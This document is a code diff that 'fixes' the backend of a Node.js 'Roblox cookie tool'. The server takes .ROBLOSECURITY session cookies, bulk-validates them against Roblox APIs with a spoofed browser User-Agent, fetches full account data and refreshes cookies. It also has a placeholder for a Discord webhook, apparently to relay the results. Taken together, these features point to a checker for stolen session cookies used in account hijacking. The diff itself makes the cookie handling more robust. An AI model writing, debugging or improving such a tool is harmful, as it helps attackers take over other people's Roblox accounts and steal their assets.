@@ -1,5 +1,5 @@
 // ============================================
-// ROBLOX COOKIE TOOL — BACKEND
+// ROBLOX COOKIE TOOL — BACKEND (FIXED)
 // Install: npm install express axios tough-cookie axios-cookiejar-support cors
 // Run: node server.js
 // ============================================
@@ -7,7 +7,7 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const { CookieJar } = require('tough-cookie');
+const { CookieJar, Cookie } = require('tough-cookie');
 const { wrapper } = require('axios-cookiejar-support');
 
 const app = express();
@@ -16,6 +16,32 @@ app.use(express.json({ limit: '10mb' }));
 
 const DISCORD_WEBHOOK = 'ISI_URL_WEBHOOK_DISCORD_LU';
 const PORT = process.env.PORT || 3000;
+
+// ============================================
+// HELPER — SET COOKIE (BYPASS PARSER)
+// ============================================
+async function setCookieSafe(jar, cookieValue) {
+  const cookie = new Cookie({
+    key: '.ROBLOSECURITY',
+    value: cookieValue.trim(),
+    domain: '.roblox.com',
+    path: '/',
+    secure: true,
+    httpOnly: true
+  });
+  await jar.setCookie(cookie, 'https://www.roblox.com');
+  return jar;
+}
+
+// ============================================
+// HELPER — CLEAN COOKIE
+// ============================================
+function cleanCookie(c) {
+  return (c || '').trim()
+    .replace(/\s+/g, '')
+    .replace(/\n/g, '')
+    .replace(/\r/g, '');
+}
 
 // ============================================
 // HELPER — DISCORD
@@ -105,12 +131,14 @@ async function fetchAccountData(jar, csrfToken) {
 // ENDPOINT — CHECK COOKIE
 // ============================================
 app.post('/api/check-cookie', async (req, res) => {
-  const { cookie } = req.body;
+  let { cookie } = req.body;
   if (!cookie) return res.json({ valid: false, error: 'No cookie' });
+
+  cookie = cleanCookie(cookie);
 
   try {
     const jar = new CookieJar();
-    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
+    await setCookieSafe(jar, cookie);
     const client = wrapper(axios.create({ jar }));
 
     const r = await client.get('https://users.roblox.com/v1/users/authenticated');
@@ -124,12 +152,14 @@ app.post('/api/check-cookie', async (req, res) => {
 // ENDPOINT — FULL DATA
 // ============================================
 app.post('/api/fetch-by-cookie', async (req, res) => {
-  const { cookie } = req.body;
+  let { cookie } = req.body;
   if (!cookie) return res.json({ success: false, error: 'No cookie' });
+
+  cookie = cleanCookie(cookie);
 
   try {
     const jar = new CookieJar();
-    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
+    await setCookieSafe(jar, cookie);
     const client = wrapper(axios.create({ jar }));
 
     let csrfToken = '';
@@ -156,7 +186,7 @@ app.post('/api/bulk-check-cookie', async (req, res) => {
   const results = [];
 
   for (let i = 0; i < cookies.length; i++) {
-    const cookieValue = (cookies[i] || '').trim();
+    const cookieValue = cleanCookie(cookies[i]);
     if (!cookieValue) {
       results.push({ index: i, valid: false, error: 'Empty cookie' });
       continue;
@@ -164,7 +194,7 @@ app.post('/api/bulk-check-cookie', async (req, res) => {
 
     try {
       const jar = new CookieJar();
-      await jar.setCookie(`.ROBLOSECURITY=${cookieValue}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
+      await setCookieSafe(jar, cookieValue);
       const client = wrapper(axios.create({
         jar,
         headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
@@ -236,12 +266,14 @@ app.post('/api/bulk-check-cookie', async (req, res) => {
 // ENDPOINT — COOKIE REFRESH
 // ============================================
 app.post('/api/refresh-cookie', async (req, res) => {
-  const { cookie } = req.body;
+  let { cookie } = req.body;
   if (!cookie) return res.json({ success: false, error: 'No cookie provided' });
+
+  cookie = cleanCookie(cookie);
 
   try {
     const jar = new CookieJar();
-    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
+    await setCookieSafe(jar, cookie);
     const client = wrapper(axios.create({
       jar,
       withCredentials: true,
